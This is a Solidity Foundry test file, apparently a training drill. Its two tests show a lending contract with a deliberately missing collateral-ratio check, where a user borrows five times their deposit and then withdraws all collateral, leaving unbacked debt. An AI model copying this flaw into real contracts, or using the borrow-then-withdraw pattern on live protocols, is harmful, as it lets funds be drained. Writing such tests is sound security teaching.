// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/Drill8D_Invariant.sol";

contract Drill8D_Test is Test {
    LendingWithBrokenInvariant lend;
    MockToken token;
    address alice = address(0xAA);

    function setUp() public {
        token = new MockToken();
        lend = new LendingWithBrokenInvariant(address(token));
        token.mint(alice, 100 ether);
        token.mint(address(lend), 1000 ether);  // fund lend for borrow
    }

    function test_InvariantBroken_BorrowMoreThanDeposit() public {
        vm.startPrank(alice);
        token.approve(address(lend), type(uint256).max);
        lend.deposit(10 ether); // Alice deposits 10

        // BUG: Can borrow 50 — more than collateral
        lend.borrow(50 ether);  // BUG: no collateral ratio check
        vm.stopPrank();

        // Invariant broken: borrowed > deposited
        assertGt(lend.borrowed(alice), lend.deposited(alice), "invariant violated");
    }

    function test_InvariantBroken_WithdrawUnderwater() public {
        vm.startPrank(alice);
        token.approve(address(lend), type(uint256).max);
        lend.deposit(10 ether);
        lend.borrow(50 ether);  // BUG: no collateral ratio check
        // Withdraw all collateral — leaves debt with zero backing
        lend.withdraw(10 ether);
        vm.stopPrank();

        // Protocol insolvent: alice has 50 debt, 0 collateral
        assertEq(lend.deposited(alice), 0);
        assertGt(lend.borrowed(alice), 0);
    }
}
